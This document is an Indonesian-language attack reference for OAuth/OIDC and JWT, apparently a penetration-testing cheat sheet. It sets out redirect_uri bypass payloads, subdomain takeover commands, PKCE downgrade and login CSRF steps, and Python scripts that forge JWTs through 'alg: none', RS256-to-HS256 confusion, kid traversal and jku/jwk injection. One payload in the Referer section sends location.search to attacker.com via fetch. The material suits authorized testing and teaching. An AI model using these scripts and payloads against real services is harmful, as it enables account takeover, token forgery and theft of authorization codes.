# oauth-jwt — auth

# OAuth 2.0 / OIDC + JWT: Referensi Serangan

## 1. OAuth/OIDC Flow — Baseline

```
GET /authorize?response_type=code
    &client_id=webapp-prod
    &redirect_uri=https://app.target.com/callback
    &scope=openid+profile+email
    &state=r4nd0m...
    PKCE: code_challenge=BASE64URL(SHA256(verifier))
```

Off-path: token exchange `POST /token` dengan `code` + `code_verifier`.

---

## 2. redirect_uri Abuse

### 2.1 Path Traversal

**Kirim:**
```
GET /authorize?client_id=webapp-prod
    &redirect_uri=https://app.target.com/callback/../../admin/oauth_done
```

**Benar:** IdP (Auth0, Okta, keycloak < 13 patch) normalisasi path → redirect tetap ke `https://app.target.com/callback/...` → `location: https://app.target.com/callback/%2e%2e%2f...`. **Salah:** nginx 1.25 di depan aplikasi menormalkan `/../` di layer proxy_pass sehingga request mendarat di `/admin/oauth_done` — IdP tidak melihat normalisasi backend, hanya string prefix match.

Payload varian yang sering lolol:
```
/callback/..%2F..%2F/callback          # encode tunggal
/callback%2f%2e%2e%2f                  # IdP decode, backend tidak
/callback/....//callback               # Windows/IIS norm "...." → ".."
/callback/%2e%2e%2f%2e%2e%2f           # double decode di backend
```

**Alur bukti:**
1. Daftarkan `https://app.target.com/callback` sebagai redirect_uri valid di IdP (enumerasi via error message: "redirect_uri mismatch" vs 302 = ada info leak).
2. Kirim authorize dengan traversal — perhatikan apakah response 400 atau 302.
3. Jika 302, ikuti manual — `Location` header menunjukkan endpoint tujuan sebenarnya?
4. Ganti endpoint tujuan ke host yang kita kontrol: butuh traversal + open redirect (`/callback/..%2f..%2f/redirect?url=https://evil.com`) atau endpoint yang log query string.

**Kenapa gagal:** RFC 8251/IdP modern (Auth0 sejak 2020, Okta policy) pakai exact match. `state` tidak melindungi di sini — code dikirim ke attacker sebelum state dicek.

### 2.2 Regex Lemah pada Validasi redirect_uri

Server-side validation sering:
```python
if re.match(r'^https://[a-z0-9.-]*\.target\.com', redirect_uri): pass
```
Input: `https://evil.target.com.attacker.com/callback` — regex tak anchored/isian `.*target\.com` di posisi mana pun.

Payload:
```
https://app.target.com.evil.com/cb
https://target.com@evil.com/cb
https://app.target.com#@evil.com/cb        # fragment injection ke endpoint legit
https://target.com.evil.com
https://app.attacker-target.com             # suffix: *.target.com matching greedy
```

**Alur bukti:** brute-force variasi via burp Intruder dengan wordlist subdomain trick → bandingkan response `302 + Location` vs `400 invalid redirect_uri`. Perhatikan juga: banyak IdP return `302` dulu ke redirect_uri sebelum validasi, validasi di `/token` saja → tinggal host kanan URL.

### 2.3 Subdomain Takeover di redirect_uri

**Kirim:** `redirect_uri=https://dangling.target.com/cb` — subdomain di config OAuth, sudah dihapus dari DNS/CNAME ke heroku/github pages/cloudfront tapi record CNAME masih ada.

**Verify:**
```bash
dig dangling.target.com CNAME +short
# ghost-dns.herokuapp.com.
curl -s https://dangling.target.com | head  # "No such app" = bisa diklaim
heroku apps:create claim-name; heroku domains:add dangling.target.com
```

**Hasil:** IdP redirect dengan `?code=...` ke subdomain yang sekarang serve halaman kita → kode di-query log.

i18n note: NS takeover (`CNAME` ke nameserver, catatan registrasi expired) lebih tahan lama dari platform takeover — Heroku sekarang perlu verifikasi domain; GitHub Pages verifikasi via kode di CNAME TXT.

---

## 3. Missing `state` (CSRF Login)

**Kirim:** capture URL authorize lengkap dari sesi attacker sendiri. Kirim ke victim (via XSS di subdomain, referer leakage, atau social).
```
https://idp.target.com/authorize?...&redirect_uri=...&code=CODE_OF_ATTACKER
```
Victim browser hit `/callback?code=ATTACKER_CODE` → victim sekarang logged in dengan akun attacker → data yang dikorban input jadi accessible attacker.

**Alur bukti:**
1. Login sebagai attacker, intercept authorize response.
2. Ambil code dari callback, send ke victim (via XSS, referer leak, or link shortener).
3. Victim hits `/callback?code=ATTACKER_CODE` → victim session now attacker account.
4. Observe: victim uploads data/payload token → attacker bisa baca.

**Kenapa gagal:** Powerful jika ada fitur "profile edit, PII, integrasi token" — tanpa itu, impact terbatas session fixation. Banyak IdP menolak reuse code setelah 3–5 menit (lifetime pendek), harus di-relay cepat.

### 3.1 PKCE Downgrade

Target: public client (SPA/mobile).

**Cara:** proxy attacker (evil AP, atau script on-path) strip parameter dari request ke `/authorize`:
```
Asli:    GET /authorize?...&code_challenge=abc
Dipotong: GET /authorize?...                 # S256 removed
```

Jika server tidak enforce PKCE (tidak return `error=invalid_request` di token tanpa verifier, atau menerima request authorize tanpa challenge), code bisa di-tukarkan oleh attacker tanpa verifier.

**Alur bukti:**
1. Buat dua request /authorize — dengan dan tanpa `code_challenge`.
2. Jika keduanya `302 + state valid` → authorize tidak enforce.
3. Cek `/token`: kirim `grant_type=authorization_code` tanpa `code_verifier`.
4. `200 + access_token` = downgrade penuh. `error=invalid_grant` = IdP menyimpan challenge, gagal.

Vektor praktis: referer/callback `response_type=code` di client public tanpa PKCE + `code` intercept pada custom URL scheme mobile (OAuth loopback `http://127.0.0.1:port` juga interceptable di beberapa platform — iOS custom scheme global, Android exported activity).

---

## 4. Code Leak via Referer

**Mekanisme:** browser load resource third-party di halaman callback → `Referer: https://app.target.com/callback?code=AUTHZ_CODE&state=...` terkirim.

**Alur bukti:**
1. Login flow, observe halaman `/callback` — list source pihak ketiga (analytics, script CDN, embedded media, image tracking).
2. Periksa `Referrer-Policy` response header.
3. Jika header absent → default Chrome 131 = `strict-origin-when-cross-origin` → leakage hanya origin (tanpa code). **Tapi**: same-site navigation, atau header `unsafe-url`, atau halaman callback lama yang belum deploy CSP — masih bocor.
4. Bypass via referer legacy: embed `<meta name="referrer" content="unsafe-url">` jika attacker ada registrasi third-party pada callback yang render user-controlled embed.

**Payload tarikan Referer (jika punya XSS point di halaman lain):**
```
<img src="https://attacker.com/log">
<script>fetch('https://attacker.com/log?c='+location.search)</script>
```

Mitigasi teoretis: code di fragment (`response_mode=fragment`), atau ambil code di server-side route. `Referrer-Policy: no-referrer` di callback.

---

## 5. IdP Mix-Up

**Kondisi:** client terdaftar di dua IdP (misal `idp-corporate.target.com` dan `idp-partner.vendor.com`).

**Alur bukti:**
1. Attacker initiate flow dengan client_id yang sama di IdP kedua.
2. Victim mengklik link authorize ke IdP attacker-controlled vendor endpoint.
3. Response callback: `https://app.target.com/callback?code=VENDOR_CODE&iss=https://idp-partner.vendor.com` — perhatikan `iss` param (OIDC).
4. Jika app tidak verifikasi `iss`, code dikirim ke `/token` IdP korporat → `invalid_grant` OR lebih buruk: app session mapping salah → token vendor terpakai di konteks korporat.

**Verifikasi cepat:** kirim callback dengan `iss` tidak valid: `?code=x&iss=https://evil.com` — apakah app login/accept? OIDC spec (RFC 9207 / RFC 6749bis) menyarankan `iss` param untuk anti-mixup. App yang tidak cek `iss` = vuln.

---

## 6. JWT Attacks

### 6.1 `alg: none`

**Payload:**
```python
import base64, json
def b64(d): return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

payload = json.dumps({"sub":"admin@target.com","iss":"https://idp.target.com","role":"admin","exp": 9999999999})
jwtheader = json.dumps({"alg":"none","typ":"JWT"})
token = f"{b64(jwtheader.encode())}.{b64(payload.encode())}."
# signature = empty string, dot tetap ada
```

Kirim sebagai `Authorization: Bearer <token>`, atau di `id_token` ke `/token` endpoint.

Hasil: `200` + akses resource call — library tidak reject. Kenapa sukses: `PyJWT < 1.5.2`, versi lama `jwt-node` tidak default verify. Modern library: `jwt.io`, `jose` npm (2022+ CVE-2022-23540/41/42 versi <= 4.14), `python-jose < 3.3` — check dependency CVE sebelum test:

```bash
pip list 2>/dev/null | grep -i jose; npm ls jose jsonwebtoken 2>/dev/null
```

### 6.2 RS256 → HS256 Confusion

**Payload:**
```python
import jwt, requests
pubkey_jwk = requests.get("https://idp.target.com/.well-known/jwks.json").json()
# Ambil RS256 public key, sign sebagai HS256
pub_pem = jwt.algorithms.RSAAlgorithm.from_jwk(json.dumps(pubkey_jwk["keys"][0]))
pub_pem = pub_pem.save_pkcs1().decode()   # atau via cryptography lib

new_jwt = jwt.encode({"sub":"admin","iss":"https://idp.target.com"}, pub_pem, algorithm="HS256")
```

**Kenapa sukses:** server verify dengan `jwt.decode(token, key=public_key, algorithms=["HS256","RS256"])` — public key terekspos via JWKS jadi "rahasia" HMAC.

**Kenapa gagal:** modern library pin `alg` server-side, `PyJWT` sejak 1.5 menolak RSA-PEM → HMAC tanpa opsi `algorithms=[...]` eksplisit. Check response header / error message untuk identify version:

```
"alg" header value HS256 not allowed  # pyjwt >= 2.x
```

### 6.3 `kid` Path Traversal / SQLi

JWKS fetch sering: `key_file = path + kid`. **Payload:**
```python
jwt.encode({"sub":"admin"}, "any_secret", algorithm="HS256",
           headers={"kid":"../../../../dev/null"})
```
- `kid: ../../../../dev/null` → file `/dev/null` = empty content → HMAC sign with empty key = trivially forge.
- `kid: /var/www/html/shell.php` → jika pub hanya fetch file, attacker host file kunci di path yang readable (perlu LFI untuk punya file dengan konten diketahui).
- `kid: x'; SELECT ...--` → jika kid masuk SQL query untuk lookup kunci (SQL injection → predictably craft kid = string diketahui, key diketahui attacker via debug response/uniform error).

Tes anti-blind kunci: sign dengan string "test", hindari `alg:none`, lihat hasilnya — `invalid signature` vs forge sukses.

### 6.4 `jwk` / `jku` / `x5u` Injection

Header-field injection: library yang menerima kunci dari header — attacker attach kunci publik sendiri:

```python
rsa_priv = ...generate...
rsa_pub = ...export JWK...

new_jwt = jwt.encode({"sub":"admin"}, priv, algorithm="RS256", headers={
    "jwk": json.loads(rsa_pub_jwk)      # KID harus match di library
})
```

Untuk `jku` (JSON Web Key Set URL):
```json
{"jku":"https://attacker.com/jwks.json","kid":"key123","alg":"RS256"}
```
Server fetch key dari URL tersebut (sering Kubernetes service account / custom validator), check kid match, verify. Berhasil pada custom Python `get_key(token) = requests.get(token_header["jku"])`.

`x5u` (cert URL) dan `x5c` (inline cert chain) sama pola — target library validator yang fetch chain dari URL hostile.

### 6.5 Claim Abuse

| Claim | Cara abuse | Payload |
|---|---|---|
| `iss` | tidak diverifikasi | `{"iss":"https://evil.com"}` — masuk jika server tidak compare terhadap IdP yang valid |
| `aud` | apapun diterima | `{"aud":"any-other-client"}` — cross-service token (client B pakai token client A) |
| `exp` | tidak dicek, atau timestamp string ("inf") | `{"exp": "9999999999"}` — banyak lib pakai `math.floor`, error, bypass depending |
| `nbf` (premature) | `{"nbf": 0}` |
| `alg` di `at_hash`/`c_hash` (id_token flow) | hash mismatch ignored |

Eksploitasi `aud` mis-target: kirim access token service A (scope terbatas) ke service B yang pakai JWT introspection sama tetapi tidak cek `aud`. Contoh: OAuth2 CTF pattern.

Dedup e2e: selalu menandai versi lib, misalnya golang-jwt v5 fix `aud` enforcement di breaking changes.

---

## 7. Jebakan Operasional (Penyebab Gagal di Lapangan)

1. **IdP exact-match redirect_uri** — authentikasi `?` redirect_uri pakai query param encoding, URL comparison di IdP pakai string EXACT. `Authorization Code Flow` di Auth0/Okta buang varian encode — traversal banyak tidak lolos di IdP modern, hanya internal redirect (nginx path normalize, X-Forwarded-* misconfig).
2. **`Referrer-Policy` default Chrome 131/Edge modern** sudah `strict-origin-when-cross-origin` — referer leak ke cross-origin tidak mengandung code kecuali header unsafe di server yang bisa anda modifikasi? Tidak anda modifikasi server — kebanyakan kasus referer leak sekarang hanya cross-site same-origin (analytics pihak ketiga yang sedang berjalan di page callback JS-supported).
3. **Exploit `alg:none` sering obsolete** — library 3 tahun terakhir pin algorithm, tapi banyak internal framework yang masih pakai lib lama (jsonwebtoken < 9 untuk HS256 null-secret case, CVE-2022-23529, perlu cek "secretOrPrivateKey" null bypass).
4. **`kid` traversal** butuh kontrol konten file di server — jarang punya, kecuali aplikasi punya fitur upload yang bisa kita taruh file di path predictable.
5. **jku/x5u** hanya bekerja pada kode kustom yang fetch key by URL — bukan default library. Test kustom validator, tidak untuk keycloak/auth0 standar.
6. **state+PKCE berlapis** — jika sedang mengejar chain (XSS → code theft → token), PKCE S256 di client server-side type attacking di authorization code theft sebenarnya tidak dibutuhkan (confidential client) — jangan downgrade-target aplikasi tipe ini, tidak berlaku.
7. **Race condition code lifetime** — banyak IdP code expire < 60 detik, single-use. Manual Burp manipulation terlalu lambat; perlu otomasi token relay.
8. **JWKS endpoint cache** — kadang ganti `jku` → server cache key dengan kid param, beberapa kombinasi tidak tersentuh; restart/test ulang dan monitor `Cache-Control` di response JWKS.
9. **Windows path norm** — `....//` dan backslash `%5c` traversal di redirect_uri hanya relevan pada backend Windows Server/IIS 10 (HTTP.sys), tidak pada nginx 1.25/Linux yang punya norm behavior beda. Perlu fingerprint backend sebelum pilih payload traversal.
10. **IdP mix-up sekarang mitigasi dengan `iss` penalty** — RFC 9207 dianjurkan; aplikasi modern yang send `iss` ke callback dan validate — check `iss` param sebelum asumsi.

---

**Checklist cepat engagement:** (1) enumerate redirect_uri acceptance via error-based oracle, (2) fingerprint IdP platform/version (login page, .well-known/openid-configuration contents), (3) check `_token` endpoint accept downgrade PKCE, (4) check library version via error string, (5) test traversal per-backend OS fingerprint, (6) verify `kid` favorable lookup, (7) capture referer on callback with third-party req.

---

## [reasoning trace]


